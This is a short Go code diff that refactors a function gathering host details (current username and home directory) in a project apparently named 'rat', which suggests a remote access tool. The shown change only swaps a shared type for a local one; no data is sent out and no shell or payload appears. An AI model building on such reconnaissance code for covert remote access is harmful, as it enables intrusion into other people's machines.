@@ -7,17 +7,17 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
-	"rat/shared"
+
 )
 
-func GetComputerInformation() shared.Computer {
+func GetComputerInformation() Computer {
 	u, err := user.Current()
 
 	if err != nil {
 		fmt.Println(err.Error())
 	}
 
-	info := shared.Computer{}
+	info := Computer{}
 
 	info.Username = u.Username
 	info.HomeDir = u.HomeDir
